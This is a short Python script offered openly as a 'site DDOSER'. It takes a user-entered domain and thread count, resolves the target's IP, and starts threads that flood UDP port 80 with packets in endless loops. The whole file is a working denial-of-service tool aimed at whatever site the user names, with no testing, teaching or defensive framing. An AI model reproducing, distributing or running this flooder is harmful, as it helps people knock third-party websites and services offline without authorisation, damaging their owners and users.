import time
import socket
import sys
import _thread
print("hello for site DDOSER!")
print("you can DDOS sites with this program")
print("created by parham555 (https://github.com.parham555)")
print("")
print("enter site URL: (example: example.com)")
site = input(">>> ")
print("site =>"+site)
print("")
print("Do not increase the number of threads! If it is too much, the program will not work.")
print("Enter your thread: ")
thread_count = input(">>> ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'parham555'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        timeHMS = time.strftime('"%H:%M:%S"')
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent "+timeHMS)
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass